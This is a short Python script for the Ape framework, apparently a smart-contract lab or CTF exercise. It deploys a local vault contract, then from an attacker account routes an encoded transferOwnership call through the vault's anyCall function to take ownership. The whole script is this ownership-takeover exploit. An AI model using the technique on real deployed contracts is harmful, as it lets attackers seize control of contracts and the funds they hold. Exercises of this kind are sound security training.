#!/usr/bin/python3
from ape import Contract, accounts, convert, networks, project
from scripts.deploy import deploy
from scripts.helper_functions import get_account

# from hexbytes import Hexbytes


def attack():
    vault = deploy()
    owner, attacker = get_account()

    # convert the address to int
    value_address_int = convert(vault.address, int)

    function_signature = vault.transferOwnership.encode_input().hex()
    function_signature_int = convert(function_signature, int)

    vault.anyCall(function_signature_int, 0, sender=attacker)

    print(vault.name())
    print(vault.owner())

def main():
    attack()


if __name__ == "__main__":
    main()
